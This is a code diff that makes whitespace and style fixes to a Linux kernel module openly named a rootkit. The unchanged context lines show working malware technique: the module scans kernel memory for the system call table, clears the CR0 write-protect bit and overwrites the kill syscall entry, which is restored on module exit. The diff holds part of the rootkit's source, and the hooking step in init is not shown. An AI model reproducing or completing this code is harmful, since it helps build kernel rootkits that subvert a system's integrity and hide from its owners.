@@ -27,7 +27,7 @@ static unsigned long **aquire_sys_call_table(void) {
 	unsigned long int offset;
 
 	// going through all addresses
-	for (offset =  PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {
+	for (offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {
 		sct = (unsigned long **) offset;
 		// sys_close exported by the kernel
 		if (sct[__NR_close] == (unsigned long *) sys_close) {
@@ -41,7 +41,7 @@ static unsigned long **aquire_sys_call_table(void) {
 static int __init rootkit_init(void) {
 	unsigned long **sys_call_table = aquire_sys_call_table();
 
-	if(!(sys_call_table)) {
+	if (!sys_call_table) {
 		return -1;
 	}
 	
@@ -57,12 +57,12 @@ static int __init rootkit_init(void) {
 static void __exit rootkit_cleanup(void) {
 	unsigned long **sys_call_table = aquire_sys_call_table();
 
-	if(!sys_call_table) {
+	if (!sys_call_table) {
 		return;
 	}
 	
 	write_cr0(read_cr0() & ~0x00010000); // clear WP
-	sys_call_table[__NR_kill] = (unsigned long *)ref_sys_kill; // restore
+	sys_call_table[__NR_kill] = (unsigned long *) ref_sys_kill; // restore
 	write_cr0(read_cr0() | 0x00010000); // set WP
 
 	printk(KERN_INFO "Rootkit removed\n");
